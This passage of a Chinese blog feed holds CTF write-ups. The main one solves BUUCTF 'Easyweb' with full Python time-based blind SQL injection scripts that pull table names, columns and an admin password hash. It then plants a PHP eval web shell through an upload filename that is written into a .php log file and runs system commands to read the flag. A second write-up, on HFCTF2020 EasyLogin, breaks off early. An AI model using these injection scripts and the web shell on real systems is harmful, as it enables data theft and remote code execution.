class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+0%2C1)%2C1%2C1))&gt;102+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://3b957018-00b0-4c15-be8e-7990ee9455c2.node5.buuoj.cn:81/image.php?id=\\0&amp;path=%20&#x27;</span><br><span class="hljs-comment"># table_len存储每张表的长度</span><br>table_len = [<span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>]<br><span class="hljs-comment"># table_name存储每张表的名字</span><br>table_name = []<br><span class="hljs-comment"># index存储现在处理的是第index+1张表</span><br>index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 由于获取的是所有表名总字符串，所以只要遍历一次即可</span><br><span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">1</span>):<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-comment"># n表示当前处理的表所处理的是第n个字符</span><br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (n &lt;= table_len[index]):<br>        <span class="hljs-comment"># 从可打印字符开始</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 对第n个字符进行判断</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>            <span class="hljs-comment"># mysql的if(条件,结果1,结果2):条件正确则为结果1，条件为flase为结果2</span><br>            <span class="hljs-comment"># payload = &quot;1&#x27;/**/and/**/if(ascii(substr((seLEct(GROUP_CONCAT(TABLE_NAME))from(infoRmation_schema.tables)where(TABLE_SCHEMA/**/like/**/&#x27;ctf&#x27;)),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(5),1)#&quot;.format(n, tmp)</span><br>            payload = <span class="hljs-string">&quot;or%20if(ascii(substr((seLEct(GROUP_CONCAT(TABLE_NAME))from(infoRmation_schema.tables)where(table_schema=database())),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),1)%23&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>            <span class="hljs-built_in">print</span>(payload)<br>            <span class="hljs-comment"># 开始记时</span><br>            start_time = time.time()<br>            r = requests.get(url+payload)<br>            <span class="hljs-keyword">if</span> (time.time() - start_time &gt; <span class="hljs-number">2</span>):<br>                <span class="hljs-comment"># 返回true界面 </span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 返回flase界面</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>        name = name + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># 继续下一个字符</span><br>        n = n + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 存储该表的表名</span><br>    table_name.append(name)<br>    <span class="hljs-comment"># 打印该表的表名</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&#123;&#125;张表的名字为&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(index+<span class="hljs-number">1</span>, name))<br>    <span class="hljs-comment"># 继续下一个表</span><br>    index = index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_name)<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-20-Easyweb/image-20240130152438544.png" alt="image-20240130152438544"></p><p>爆出表的信息为:images,users</p><h3 id="爆表的字段，这里直接爆users表的"><a href="#爆表的字段，这里直接爆users表的" class="headerlink" title="爆表的字段，这里直接爆users表的:"></a>爆表的字段，这里直接爆users表的:</h3><p>由于payload要用到对数据表的筛选，所以我们需要用16进制来代表数据表进行绕过</p><p><img src="/images/2023-08-20-Easyweb/image-20240130160952607.png" alt="image-20240130160952607"></p><p>users的16进制为0x7573657273</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;users&#x27;+limit+0%2C1)%2C1%2C1))%3D117+%23</span><br><br>url = <span class="hljs-string">&#x27;http://3b957018-00b0-4c15-be8e-7990ee9455c2.node5.buuoj.cn:81/image.php?id=\\0&amp;path=%20&#x27;</span><br><br><span class="hljs-comment"># table_col_num存储每张表每个字段所对应的长度</span><br>table_col_num = &#123;<span class="hljs-string">&#x27;users第1字段的长度&#x27;</span>: <span class="hljs-number">50</span>&#125;<br><span class="hljs-comment"># table_name存储每张表的名字</span><br>table_name = [<span class="hljs-string">&#x27;users&#x27;</span>]<br><span class="hljs-comment"># col_count存储每张表的字段数</span><br><span class="hljs-comment"># 将所有字段合在一起输出就是只有一个字段</span><br>col_count = &#123;<span class="hljs-string">&#x27;users&#x27;</span>: <span class="hljs-number">1</span>&#125;<br><span class="hljs-comment"># table_col_name存储每张表的字段的名字</span><br>table_col_name = &#123;&#125;<br><br>table_num = <span class="hljs-built_in">len</span>(table_name)<br>table_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 先对表进行遍历,只有表F1naI1y</span><br><span class="hljs-keyword">while</span> (table_index &lt; <span class="hljs-number">1</span>):<br>    <span class="hljs-comment"># 当前表的名字:table_name[table_index]</span><br>    <span class="hljs-comment"># col_num存储当前表的字段数</span><br>    col_num = col_count[table_name[table_index]]<br>    col_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># 对当前表的字段进行遍历，获取全部字段名，所以只有一个字段</span><br>    <span class="hljs-keyword">while</span> (col_index &lt; <span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># table_col_key存储当前表当前字段的key</span><br>        key = <span class="hljs-string">&quot;&#123;&#125;第&#123;&#125;字段的长度&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># col_len存储当前字段的长度</span><br>        col_len = table_col_num[key]<br>        <span class="hljs-comment"># 遍历当前字段</span><br>        col_len_index = <span class="hljs-number">0</span><br>        <span class="hljs-comment"># name存储当前字段的名称</span><br>        name = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> (col_len_index &lt; col_len):<br>            <span class="hljs-comment"># 用二分法对当前字段进行猜解</span><br>            <span class="hljs-comment"># 从可打印字符开始</span><br>            begin = <span class="hljs-number">32</span><br>            end = <span class="hljs-number">126</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># 对第n个字符进行判断</span><br>            <span class="hljs-keyword">while</span> (begin &lt; end):<br>                <span class="hljs-comment"># payload = &quot;1/**/and/**/if(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME/**/like/**/&#x27;flag&#x27;)),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(5),1)#&quot;.format(col_len_index+1, tmp)</span><br>                payload = <span class="hljs-string">&#x27;or%20if(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME=0x7573657273)),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),1)%23&#x27;</span>.<span class="hljs-built_in">format</span>(col_len_index+<span class="hljs-number">1</span>, tmp)<br>                <span class="hljs-built_in">print</span>(payload)<br>                <span class="hljs-comment"># 开始记时</span><br>                start_time = time.time()<br>                r = requests.get(url+payload)<br>                <span class="hljs-keyword">if</span> (time.time() - start_time &gt; <span class="hljs-number">2</span>):<br>                    <span class="hljs-comment"># 返回true界面 </span><br>                    begin = tmp + <span class="hljs-number">1</span><br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># 返回flase界面</span><br>                    end = tmp<br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>            <span class="hljs-comment"># print(tmp)</span><br>            name = name + <span class="hljs-built_in">chr</span>(tmp)<br>            <span class="hljs-comment"># 继续下一个字符</span><br>            col_len_index = col_len_index + <span class="hljs-number">1</span><br>        <span class="hljs-comment"># 存储当前字段的名称:</span><br>        key_name = <span class="hljs-string">&quot;&#123;&#125;的第&#123;&#125;个字段的名字&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        table_col_name[key_name] = name<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(key_name, name))<br>        <span class="hljs-comment"># 继续下一个字段</span><br>        col_index = col_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 继续下一张表</span><br>    table_index = table_index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_col_name)<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-20-Easyweb/image-20240130161721449.png" alt="image-20240130161721449"></p><p>得到字段为username和password</p><h3 id="爆字段的值"><a href="#爆字段的值" class="headerlink" title="爆字段的值:"></a>爆字段的值:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://3b957018-00b0-4c15-be8e-7990ee9455c2.node5.buuoj.cn:81/image.php?id=\\0&amp;path=%20&#x27;</span><br><br><span class="hljs-comment"># database_name存储数据库名字</span><br>database_name = <span class="hljs-string">&quot;ciscnfinal&quot;</span><br><span class="hljs-comment"># table_name存储指定表的名字</span><br>table_name = <span class="hljs-string">&quot;users&quot;</span><br><span class="hljs-comment"># col_name存储指定字段的名字</span><br>col_name = <span class="hljs-string">&quot;password&quot;</span><br><span class="hljs-comment"># col_data_num存储有多少列</span><br><span class="hljs-comment"># 手动指定要查看多少列数据，由于合在一起显示所以只有一列</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnum存储每个字段数据的字符个数</span><br><span class="hljs-comment"># 手动指定要查看多少字符数据</span><br>col_data_charnum = <span class="hljs-number">90</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 先遍历该字段有多少列</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># data用来字段该列的数据</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># 用二分法对当前字段进行猜解</span><br>        <span class="hljs-comment"># 从可打印字符开始</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 对第n个字符进行判断</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># payload = &quot;1/**/and/**/if(ascii(substr((seLEct(GrOUp_cOncAT(&#123;0&#125;))from(&#123;1&#125;)),&#123;2&#125;,1))&gt;&#123;3&#125;,sleep(5),1)#&quot;.format(col_name, table_name, rank_data_index+1, tmp)</span><br>            payload = <span class="hljs-string">&#x27;or%20if(ascii(substr((seLEct(GrOUp_cOncAT(&#123;0&#125;))from(&#123;1&#125;)),&#123;2&#125;,1))&gt;&#123;3&#125;,sleep(5),1)%23&#x27;</span>.<span class="hljs-built_in">format</span>(col_name, table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-built_in">print</span>(payload)<br>            <span class="hljs-comment"># 开始记时</span><br>            start_time = time.time()<br>            r = requests.get(url+payload)<br>            <span class="hljs-keyword">if</span> (time.time() - start_time &gt; <span class="hljs-number">5</span>):<br>                <span class="hljs-comment"># 返回true界面 </span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 返回flase界面</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># 继续下一个字符</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 继续下一列</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;字段第&#123;&#125;列的值:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-20-Easyweb/image-20240130164258133.png" alt="image-20240130164258133"></p><p>得到password字段值为68c826b202e999de9b3c，username的字段值为admin</p><p>没有爆出跟flag相关的信息，但是网页存在一个登录窗口，所以我们尝试登录一下</p><h2 id="使用获取到的管理员账户信息登录网页"><a href="#使用获取到的管理员账户信息登录网页" class="headerlink" title="使用获取到的管理员账户信息登录网页:"></a>使用获取到的管理员账户信息登录网页:</h2><p><img src="/images/2023-08-20-Easyweb/image-20240130164533361.png" alt="image-20240130164533361"></p><p><img src="/images/2023-08-20-Easyweb/image-20240130164511136.png" alt="image-20240130164511136"></p><p>发现网页内部是文件上传.</p><h2 id="上传我们的木马文件"><a href="#上传我们的木马文件" class="headerlink" title="上传我们的木马文件:"></a>上传我们的木马文件:</h2><p>php后缀名的文件无法上传，所以直接上传了图片木马文件:</p><p><img src="/images/2023-08-20-Easyweb/image-20240130165927307.png" alt="image-20240130165927307"></p><p>可以得到上传信息:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">I logged the file name you uploaded to logs/upload.becfb4d956c77553d220df9fce7d4873.log.php. LOL&lt;script&gt;setTimeout(&#x27;location.href=&quot;user.php&quot;&#x27;,3000);<br></code></pre></td></tr></table></figure><p>发现响应给我们的内容是一个文件上传日志文件，且上传文件日志是一个php后缀的文件</p><h3 id="日志文件漏洞"><a href="#日志文件漏洞" class="headerlink" title="日志文件漏洞:"></a>日志文件漏洞:</h3><h4 id="假设我们的filename-hacker-png以及south666"><a href="#假设我们的filename-hacker-png以及south666" class="headerlink" title="假设我们的filename&#x3D;hacker.png以及south666:"></a>假设我们的filename&#x3D;hacker.png以及south666:</h4><h5 id="filename-hacker-png"><a href="#filename-hacker-png" class="headerlink" title="filename&#x3D;hacker.png:"></a>filename&#x3D;hacker.png:</h5><p><img src="/images/2023-08-20-Easyweb/image-20240130174235896.png" alt="image-20240130174235896"></p><h5 id="filename-south666"><a href="#filename-south666" class="headerlink" title="filename&#x3D;south666:"></a>filename&#x3D;south666:</h5><p><img src="/images/2023-08-20-Easyweb/image-20240130174540103.png" alt="image-20240130174540103"></p><h4 id="访问这个文件上传日志文件"><a href="#访问这个文件上传日志文件" class="headerlink" title="访问这个文件上传日志文件:"></a>访问这个文件上传日志文件:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">/logs/upload.becfb4d956c77553d220df9fce7d4873.log.php<br></code></pre></td></tr></table></figure><h5 id="响应结果1："><a href="#响应结果1：" class="headerlink" title="响应结果1："></a>响应结果1：</h5><p><img src="/images/2023-08-20-Easyweb/image-20240130174313391.png" alt="image-20240130174313391"></p><h5 id="响应结果2："><a href="#响应结果2：" class="headerlink" title="响应结果2："></a>响应结果2：</h5><p><img src="/images/2023-08-20-Easyweb/image-20240130174929975.png" alt="image-20240130174929975"></p><p>发现我们的文件名被写入该日志文件中，所以如果我们让filename为一句话木马，那么这个一句话木马也会被写入该日志文件中，又因为该日志文件是php后缀，所以可以直接运行被写入的一句话木马，从而达到木马注入。</p><h2 id="使用文件名为一句话木马进行注入"><a href="#使用文件名为一句话木马进行注入" class="headerlink" title="使用文件名为一句话木马进行注入:"></a>使用文件名为一句话木马进行注入:</h2><p>使用php短标签的目的是为了让文件名中的字符为合法字符</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">filename=&quot;&lt;?=@eval($_POST[&#x27;a&#x27;]);?&gt;&quot;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-20-Easyweb/image-20240130173145271.png" alt="image-20240130173145271"></p><h2 id="访问日志文件"><a href="#访问日志文件" class="headerlink" title="访问日志文件:"></a>访问日志文件:</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">/logs/upload.becfb4d956c77553d220df9fce7d4873.log.php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-20-Easyweb/image-20240130173453782.png" alt="image-20240130173453782"></p><h2 id="获取根目录信息"><a href="#获取根目录信息" class="headerlink" title="获取根目录信息:"></a>获取根目录信息:</h2><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>a=system(&#x27;ls /&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-20-Easyweb/image-20240130173346505.png" alt="image-20240130173346505"></p><h2 id="获取flag文件信息"><a href="#获取flag文件信息" class="headerlink" title="获取flag文件信息:"></a>获取flag文件信息:</h2><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>a=system(&#x27;cat /flag&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-20-Easyweb/image-20240130173546490.png" alt="image-20240130173546490"></p><p>flag&#x3D;flag{2b086623-9f7e-4dc7-aa6f-6e9733d3c01b}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF [HFCTF2020]EasyLogin</title>
    <link href="/2024/02/03/2023-2-3-EasyLogin/"/>
    <url>/2024/02/03/2023-2-3-EasyLogin/</url>
    
    <content type="html"><![CDATA[<h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h3><p>[BUUCTF—<a href="https://blog.csdn.net/m0_62107966/article/details/126801065">HFCTF2020]EasyLogin保姆级详解。-CSDN博客</a></p><p>[刷题<a href="https://www.cnblogs.com/karsa/p/12762297.html">HFCTF2020]EasyLogin - kar3a - 博客园 (cnblogs.com)</a></p><h3 id="注册一个账户登陆后"><a href="#注册一个账户登陆后" class="headerlink" title="注册一个账户登陆后:"></a>注册一个账户登陆后:</h3><p><img src="/images/2023-2-3-EasyLogin/image-20240129153552517.png" alt="image-20240129153552517"></p><h3 id="查看网页的源代码"><a href="#查看网页的源代码" class="headerlink" title="查看网页的源代码:"></a>查看网页的源代码:</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/css/bootstrap.min.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bootstrap-css&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/css/app.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/js/bootstrap.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/js/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;wrapper fadeInDown&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;formContent&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fadeIn first&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Welcome south<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fadeIn second&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;The flag will be here...&quot;</span> /&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fadeIn third&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Get Flag&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;getflag()&quot;</span> /&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;formFooter&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;underlineHover&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;logout()&quot;</span>&gt;</span>退出当前账号<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/js/app.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span 